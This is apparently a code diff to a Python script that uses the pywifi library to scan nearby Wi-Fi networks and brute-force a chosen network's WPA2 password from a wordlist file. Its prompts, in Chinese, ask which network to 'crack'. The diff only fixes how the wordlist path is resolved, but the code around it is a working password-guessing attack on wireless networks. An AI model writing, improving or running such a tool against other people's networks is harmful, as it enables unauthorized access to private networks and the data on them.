@@ -1,6 +1,8 @@
 from pywifi import PyWiFi,const, Profile
 import time
-
+import os
+path=os.path.dirname(__file__)
+file_path=path+"/密码本.txt"
 def check_wifi(iface):
     iface.scan()
     print("---扫描周围WiFi中---")
@@ -9,7 +11,7 @@ def check_wifi(iface):
         print("WiFi名称:"+i.ssid.encode("raw_unicode_escape").decode()+",信号强度:",str(i.signal+100)+"%")
 def connect_wifi(iface,pwd,wifi_name):
     profile=Profile()
-    profile.ssid = wifi_name.encode().decode('GBK')
+    profile.ssid = wifi_name.encode().decode("GBK")
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
     profile.auth=const.AUTH_ALG_OPEN
     profile.cipher=const.CIPHER_TYPE_CCMP
@@ -35,7 +37,7 @@ if __name__=="__main__":
             check_wifi(iface)
             wifi_name=input("请输入想破解wifi名称:")
             print("---开始破解---")
-            with open("./密码本.txt","r") as f:
+            with open(file_path,"r") as f:
                 while True:
                     pwd=f.readline().strip("\n")
                     if not pwd:
@@ -52,7 +54,7 @@ if __name__=="__main__":
         check_wifi(iface)
         wifi_name=input("请输入想破解wifi名称:")
         print("---开始破解---")
-        with open("./密码本.txt","r") as f:
+        with open(file_path,"r") as f:
             while True:
                 pwd=f.readline().strip("\n")
                 if not pwd:
